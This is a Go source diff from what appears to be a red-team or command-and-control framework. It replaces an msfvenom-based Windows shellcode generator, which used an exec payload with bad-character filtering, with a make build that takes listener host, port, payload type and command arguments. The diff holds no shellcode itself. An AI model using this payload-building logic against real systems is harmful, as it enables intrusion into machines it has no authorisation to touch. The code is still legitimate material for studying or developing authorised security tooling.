@@ -57,8 +57,8 @@ func NewShellcode(
 		Lprotocol: lprotocol,
 		Lhost:     lhost,
 		Lport:     lport,
-		Type:      shcType,
-		TypeArgs:  shcTypeArgs,
+		Type:      shcType,     // e.g. cmd
+		TypeArgs:  shcTypeArgs, // e.g. calc.exe
 	}
 }
 
@@ -93,71 +93,30 @@ func (s *Shellcode) Generate(serverState *state.ServerState) (data []byte, outFi
 	if s.Os == "linux" {
 		return nil, "", fmt.Errorf("linux target is not implemented yet")
 	} else if s.Os == "windows" {
-		// // Change directory
-		// os.Chdir("./payload/win/shellcode")
-		// _, err = meta.ExecCommand("rm", "-rf", "build")
-		// if err != nil {
-		// 	os.Chdir(serverState.CWD)
-		// 	return nil, "", err
-		// }
+		// Change directory
+		os.Chdir("./payload/win/shellcode")
 
-		// // Set target
-		// var target string
-		// if s.Os == "windows" {
-		// 	target = fmt.Sprintf("win-%s", s.Arch)
-		// } else {
-		// 	target = fmt.Sprintf("linux-%s", s.Arch)
-		// }
+		target := s.Arch
 
-		// fmt.Printf("Target: %s\n", target)
-
-		// _, err = meta.ExecCommand(
-		// 	"make",
-		// 	target,
-		// 	fmt.Sprintf("OUTPUT=\"%s\"", outFile),
-		// 	fmt.Sprintf("PAYLOAD_NAME=%s", s.Name),
-		// 	fmt.Sprintf("PAYLOAD_ARCH=%s", s.Arch),
-		// 	fmt.Sprintf("PAYLOAD_FORMAT=%s", s.Format),
-		// 	fmt.Sprintf("LISTENER_HOST=\"%s\"", s.Lhost),
-		// 	fmt.Sprintf("LISTENER_PORT=%s", fmt.Sprint(s.Lport)),
-		// 	// fmt.Sprintf("REQUEST_PATH_DOWNLOAD=\"%s\"", requestPathDownload),
-		// 	"-j", fmt.Sprint(serverState.NumCPU),
-		// )
-		// if err != nil {
-		// 	os.Chdir(serverState.CWD)
-		// 	return nil, "", fmt.Errorf("build error: %v", err)
-		// }
-
-		// For now, uses msfvenom
-		var msfArgs []string
-		// var originalFile string = ""
-
-		if s.Type == "cmd" {
-			msfArgs = []string{
-				"-a",
-				s.Arch,
-				"--platform",
-				s.Os,
-				"-p",
-				fmt.Sprintf("%s/%s/exec", s.Os, s.Arch),
-				fmt.Sprintf("CMD=\"%s\"", s.TypeArgs),
-				"-f",
-				"raw",
-				"-b",
-				"\\x00\\x0a\\x0d",
-				"-o",
-				outFile,
-			}
-
-		} else {
-			return nil, "", fmt.Errorf("invalid shellcode type")
+		_, err = meta.ExecCommand(
+			"make",
+			fmt.Sprintf("PAYLOAD_NAME=%s", s.Name),
+			fmt.Sprintf("PAYLOAD_ARCH=%s", s.Arch),
+			fmt.Sprintf("PAYLOAD_FORMAT=%s", s.Format),
+			fmt.Sprintf("LISTENER_HOST=\"%s\"", s.Lhost),
+			fmt.Sprintf("LISTENER_PORT=%s", fmt.Sprint(s.Lport)),
+			// fmt.Sprintf("REQUEST_PATH_DOWNLOAD=\"%s\"", requestPathDownload),
+			fmt.Sprintf("SHELLCODE_TYPE=%s", s.Type),
+			fmt.Sprintf("SHELLCODE_TYPE_ARGS=\"%s\"", s.TypeArgs),
+			fmt.Sprintf("OUTPUT=\"%s\"", outFile),
+			"-j", fmt.Sprint(serverState.NumCPU),
+			target,
+		)
+		if err != nil {
+			os.Chdir(serverState.CWD)
+			return nil, "", fmt.Errorf("build error: %v", err)
 		}
 
-		// If msfvenom, ignore the command output.
-		_, err = meta.ExecCommand("msfvenom", msfArgs...)
-		// if err != nil {
-		// 	return nil, "", fmt.Errorf("ShellcodeGenerationError: %s", err)
-		// }
 	}
 
 	data, err = os.ReadFile(outFile)
